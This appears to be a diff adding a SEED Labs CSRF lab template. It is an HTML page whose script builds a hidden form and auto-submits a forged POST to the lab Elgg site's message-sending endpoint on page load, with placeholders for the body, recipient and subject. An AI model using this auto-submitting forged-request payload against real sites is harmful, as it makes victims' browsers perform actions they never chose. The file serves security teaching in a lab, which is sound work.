@@ -1,0 +1,38 @@
+<!-- Blueprint for Post Requests for Lab 3 CSRF - SEED LABS -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Post Request Blueprint</title>
+</head>
+    <body>
+        <script type="text/javascript">
+            const send_message = () => {
+                /* 
+                    simulates form so the post request can execute
+                    put message, EID, and subject in the value attribute in inpute
+                */ 
+                let inputs = "<input type='hidden' name='body' value='<p> ** MESSAGE TO BE SENT ** </p>'>"
+                inputs += "<input type='hidden' name='recipients[]' value=' ** EID ** '>"
+                inputs += "<input type='hidden' name='subject' value=' ** VALUE FOR SUBJECT LINE ** '>"
+
+                let attackForm = document.createElement("form")
+                // website found in inspect element - header
+                attackForm.action = "http://www.csrflabelgg.com/action/messages/send"
+                attackForm.innerHTML = inputs 
+                attackForm.method = "POST"
+                document.body.appendChild(attackForm)
+                attackForm.submit()
+
+            };
+            // calls send_message when page loads, same as $document.ready({});
+            window.onload = function() {send_message()}
+
+        </script>
+
+
+    </body>
+</html>
